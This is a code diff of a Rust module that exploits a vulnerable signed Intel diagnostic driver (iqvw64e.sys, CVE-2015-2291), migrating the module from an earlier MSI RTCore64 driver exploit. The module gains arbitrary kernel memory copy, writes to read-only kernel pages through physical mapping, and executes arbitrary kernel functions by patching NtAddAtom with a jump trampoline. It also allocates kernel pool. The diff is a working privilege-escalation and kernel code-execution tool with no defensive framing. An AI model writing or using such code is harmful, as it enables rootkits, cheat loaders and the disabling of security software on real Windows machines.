@@ -1,26 +1,19 @@
-//! Signed-carrier layer: arbitrary kernel-VA read/write via MSI RTCore64.sys
-//! (CVE-2019-16098). The driver dereferences a user-supplied pointer in its
-//! own kernel context, so we read/write any mapped kernel virtual address
-//! directly: no CR3, no page-table walk, no physical scan, no test signing.
+//! Signed-carrier layer: arbitrary kernel-VA read/write via Intel's
+//! iqvw64e.sys diagnostic driver (CVE-2015-2291). One buffered IOCTL with a
+//! case-number dispatch: 0x33 copies between any two addresses (kernel or
+//! user), 0x30 fills, 0x25 translates VA->PA, 0x19/0x1A map/unmap IO space.
+//! No windows, no registration, no test signing.
 //!
-//! Device: \\.\RTCore64 (some builds use the \\.\Global\ aliased name).
-//! Wire format (48-byte buffer, same buffer in and out):
+//! Device: \\.\Nal.
+//! IOCTL:  0x80862007, 48-byte buffer (same in and out).
 //!
-//!   +0x00 BYTE  pad0[8]
-//!   +0x08 DWORD64 address   -- kernel VA to touch
-//!   +0x10 BYTE  pad1[8]
-//!   +0x18 DWORD read_size    -- 1, 2 or 4 bytes (driver only supports these)
-//!   +0x1C DWORD value        -- read result, or write payload
-//!   +0x20 BYTE  pad2[16]
-//!
-//! IOCTLs:
-//!   0x80002048 -- read  (dereference, copy 1/2/4 bytes into value)
-//!   0x8000204C -- write (dereference, store value over 1/2/4 bytes)
-//!
-//! SAFETY: the dereference is unguarded in the driver; a bad address
-//! bugchecks the box. Every read/write here is bounded by an explicit
-//! allowed window (register with `add_window`) so a garbage export RVA or
-//! stale pointer can never reach the driver.
+//!   +0x00 case  : 0x33 copy { src@0x10 dst@0x18 len@0x20 }
+//!                 0x30 fill { value@0x0C(u32) dst@0x18 len@0x20 }
+//!                 0x25 getphys { in@0x18 out@0x10 }
+//!                 0x19 mapphys { phys@0x20 size@0x28 -> va@0x18 }
+//!                 0x1A unmaphys { va@0x18 size@0x28 }
+//!   +0x08 spare
+//!   +0x10 r2, +0x18 r3, +0x20 r4, +0x28 r5(u32)
 
 use std::io;
 use windows_sys::Win32::Foundation::{CloseHandle, GetLastError, HANDLE, INVALID_HANDLE_VALUE};
@@ -29,22 +22,22 @@ use windows_sys::Win32::Storage::FileSystem::{
 };
 use windows_sys::Win32::System::IO::DeviceIoControl;
 
-const MEM_READ:  u32 = 0x8000_2048;
-const MEM_WRITE: u32 = 0x8000_204C;
+const IOCTL: u32 = 0x8086_2007;
 
 #[repr(C)]
+#[derive(Clone, Copy, Default)]
 struct Buf {
-    pad0:  [u8; 8],
-    addr:  u64,
-    pad1:  [u8; 8],
-    size:  u32,
-    value: u32,
-    pad2:  [u8; 16],
+    case: u64,
+    r1:   u64,
+    r2:   u64,
+    r3:   u64,
+    r4:   u64,
+    r5:   u32,
 }
 
 pub struct Rtc {
     handle: HANDLE,
-    wins:   Vec<(u64, u64)>, // (base, len)
+    wins:   Vec<(u64, u64)>,
 }
 
 unsafe impl Send for Rtc {}
@@ -63,12 +56,12 @@ type FnAny4      = unsafe extern "system" fn(u64, u64, u64, u64) -> i64;
 impl Rtc {
     /// Open the carrier device.
     pub fn open() -> io::Result<Self> {
-        let mut last = io::Error::new(io::ErrorKind::NotFound, "RTCore64 not found");
-        for name in [b"\\\\.\\RTCore64\0".as_ptr(), b"\\\\.\\Global\\RTCore64\0".as_ptr()] {
+        let mut last = io::Error::new(io::ErrorKind::NotFound, "Nal not found");
+        for name in [b"\\\\.\\Nal\0".as_ptr(), b"\\\\.\\GLOBALROOT\\Device\\Nal\0".as_ptr()] {
             let h = unsafe {
                 CreateFileA(
                     name,
-                    0x8000_0000 | 0x4000_0000, // GENERIC_READ | GENERIC_WRITE
+                    0x8000_0000 | 0x4000_0000,
                     FILE_SHARE_READ | FILE_SHARE_WRITE,
                     std::ptr::null(),
                     OPEN_EXISTING,
@@ -81,7 +74,7 @@ impl Rtc {
             }
             last = io::Error::new(
                 io::ErrorKind::NotFound,
-                format!("\\\\.\\RTCore64 open failed: err {}", unsafe { GetLastError() }),
+                format!("\\\\.\\Nal open failed: err {}", unsafe { GetLastError() }),
             );
         }
         Err(last)
@@ -98,85 +91,93 @@ impl Rtc {
         self.wins.iter().any(|&(b, l)| addr >= b && addr + len as u64 <= b + l)
     }
 
-    /// Single 1/2/4-byte primitive read. Returns what the driver put in value.
-    fn io_r(&self, addr: u64, size: u32) -> io::Result<u32> {
-        let mut b = Buf { addr, size, ..unsafe { std::mem::zeroed() } };
+    fn io(&self, b: &mut Buf) -> io::Result<()> {
         let mut ret = 0u32;
         let ok = unsafe {
             DeviceIoControl(
-                self.handle, MEM_READ,
-                &b as *const _ as *const _, std::mem::size_of::<Buf>() as u32,
-                &mut b as *mut _ as *mut _, std::mem::size_of::<Buf>() as u32,
-                &mut ret, std::ptr::null_mut(),
-            ) != 0
-        };
-        if ok { Ok(b.value) } else {
-            Err(io::Error::new(io::ErrorKind::Other,
-                format!("RTCore64 read @0x{:X} sz={}: err {}", addr, size,
-                    unsafe { GetLastError() })))
-        }
-    }
-
-    /// Single 1/2/4-byte primitive write.
-    fn io_w(&self, addr: u64, size: u32, value: u32) -> io::Result<()> {
-        let mut b = Buf { addr, size, value, ..unsafe { std::mem::zeroed() } };
-        let mut ret = 0u32;
-        let ok = unsafe {
-            DeviceIoControl(
-                self.handle, MEM_WRITE,
-                &b as *const _ as *const _, std::mem::size_of::<Buf>() as u32,
-                &mut b as *mut _ as *mut _, std::mem::size_of::<Buf>() as u32,
+                self.handle, IOCTL,
+                b as *const _ as *const _, std::mem::size_of::<Buf>() as u32,
+                b as *mut _ as *mut _, std::mem::size_of::<Buf>() as u32,
                 &mut ret, std::ptr::null_mut(),
             ) != 0
         };
         if ok { Ok(()) } else {
             Err(io::Error::new(io::ErrorKind::Other,
-                format!("RTCore64 write at 0x{:X} sz={}: err {}", addr, size,
+                format!("iqv ioctl case 0x{:X}: err {}", b.case,
                     unsafe { GetLastError() })))
         }
     }
 
-    /// Read `out.len()` bytes from kernel VA `addr`. 4-byte steps (driver cap).
+    /// Raw copy of `data.len()` bytes between `src` and `dst` (kernel or user).
+    pub fn mem_copy(&self, dst: u64, src: u64, len: usize) -> io::Result<()> {
+        if len == 0 { return Ok(()); }
+        let mut chunk = [0u8; 0x2000];
+        let mut off = 0usize;
+        while off < len {
+            let n = std::cmp::min(chunk.len(), len - off);
+            let mut b = Buf { case: 0x33, r2: src + off as u64, r3: dst + off as u64, r4: n as u64, ..Default::default() };
+            self.io(&mut b)?;
+            off += n;
+        }
+        Ok(())
+    }
+
     pub fn read_memory(&self, addr: u64, out: &mut [u8]) -> io::Result<()> {
         if out.is_empty() { return Ok(()); }
         if !self.in_window(addr, out.len()) {
             return Err(io::Error::new(io::ErrorKind::AddrNotAvailable,
                 format!("read 0x{:X}+{} outside allowed windows", addr, out.len())));
         }
-        let mut i = 0usize;
-        while i < out.len() {
-            let take = std::cmp::min(4, out.len() - i);
-            let v = self.io_r(addr + i as u64, take as u32)?;
-            out[i..i + take].copy_from_slice(&v.to_le_bytes()[..take]);
-            i += take;
-        }
-        Ok(())
+        self.mem_copy(out.as_mut_ptr() as u64, addr, out.len())
     }
 
-    /// Write `data` to kernel VA `addr`. 4-byte steps (driver cap).
     pub fn write_memory(&self, addr: u64, data: &[u8]) -> io::Result<()> {
         if data.is_empty() { return Ok(()); }
         if !self.in_window(addr, data.len()) {
             return Err(io::Error::new(io::ErrorKind::AddrNotAvailable,
                 format!("write 0x{:X}+{} outside allowed windows", addr, data.len())));
         }
-        let mut i = 0usize;
-        while i < data.len() {
-            let take = std::cmp::min(4, data.len() - i);
-            let mut word = [0u8; 4];
-            word[..take].copy_from_slice(&data[i..i + take]);
-            self.io_w(addr + i as u64, take as u32, u32::from_le_bytes(word))?;
-            i += take;
+        self.mem_copy(addr, data.as_ptr() as u64, data.len())
+    }
+
+    /// Kernel RO (execute) pages: translate VA->PA, map, copy, unmap.
+    pub fn write_ro_memory(&self, addr: u64, data: &[u8]) -> io::Result<()> {
+        let mut off = 0usize;
+        while off < data.len() {
+            let page_off = ((addr + off as u64) & 0xFFF) as usize;
+            let n = std::cmp::min(0x1000 - page_off, data.len() - off);
+            let pa = self.page_to_phys(addr + off as u64)? & !0xFFF;
+            let va = self.map_io(pa, 0x1000)?;
+            let r = self.mem_copy(va + page_off as u64, data.as_ptr() as u64 + off as u64, n);
+            let _ = self.unmap_io(va, 0x1000);
+            r?;
+            off += n;
         }
         Ok(())
     }
 
-    /// Kernel RO regions are written the same way (we write the kernel VA).
-    pub fn write_ro_memory(&self, addr: u64, data: &[u8]) -> io::Result<()> {
-        self.write_memory(addr, data)
+    fn page_to_phys(&self, va: u64) -> io::Result<u64> {
+        let mut b = Buf { case: 0x25, r3: va, ..Default::default() };
+        self.io(&mut b)?;
+        Ok(b.r2)
     }
 
-    // ── Export resolution (binary search over the sorted name table) ───────
+    fn map_io(&self, phys: u64, size: u32) -> io::Result<u64> {
+        let mut b = Buf { case: 0x19, r4: phys, r5: size, ..Default::default() };
+        self.io(&mut b)?;
+        if b.r3 == 0 {
+            return Err(io::Error::new(io::ErrorKind::Other,
+                format!("iqv mapphys 0x{:X} returned NULL", phys)));
+        }
+        Ok(b.r3)
+    }
+
+    fn unmap_io(&self, va: u64, size: u32) -> io::Result<()> {
+        let mut b = Buf { case: 0x1A, r3: va, r5: size, ..Default::default() };
+        self.io(&mut b)
+    }
+
+    // ── Export resolution ────────────────────────────────────────────────
 
     pub fn get_module_export(&self, module_base: u64, fn_name: &str) -> Option<u64> {
         let mut tmp4 = [0u8; 4];
@@ -226,7 +227,6 @@ impl Rtc {
                     let fn_rva = u32::from_le_bytes(b4b) as u64;
                     if fn_rva == 0 { return None; }
                     let fn_va = module_base + fn_rva;
-                    // forwarders
                     if fn_va >= module_base + exp_rva && fn_va < module_base + exp_rva + exp_size {
                         return None;
                     }
@@ -262,17 +262,13 @@ impl Rtc {
             KERNEL_NT_ADD_ATOM
         };
 
-        // a) snapshot original 12 bytes
         let mut original = [0u8; 12];
         self.read_memory(kernel_naa, &mut original)?;
-        eprintln!("[dbg] call_kernel_fn: fn=0x{:X} knaa=0x{:X} orig={:02X?}",
-            fn_addr, kernel_naa, original);
         if original[0] == 0x48 && original[1] == 0xB8 && original[10] == 0xFF && original[11] == 0xE0 {
             return Err(io::Error::new(io::ErrorKind::Other,
                 "NtAddAtom already patched -- concurrent call?"));
         }
 
-        // b) MOV RAX, fn (10B) + JMP RAX (2B), write, verify, call, restore
         let mut sc = [0u8; 12];
         sc[0] = 0x48; sc[1] = 0xB8;
         sc[2..10].copy_from_slice(&fn_addr.to_le_bytes());
@@ -299,7 +295,6 @@ impl Rtc {
     pub fn alloc_pool(&self, ntos_base: u64, size: u64) -> io::Result<u64> {
         let tag: u64 = u32::from_le_bytes(*b"BwtE") as u64;
         let addr = if let Some(ex2) = self.get_module_export(ntos_base, "ExAllocatePool2") {
-            eprintln!("[dbg] alloc_pool: ExAllocatePool2(0x80, 0x{:X})", size);
             self.kernel_call(ntos_base, ex2, 0x80, size, tag, 0)? as u64
         } else {
             let ex = self.get_module_export(ntos_base, "ExAllocatePoolWithTag")
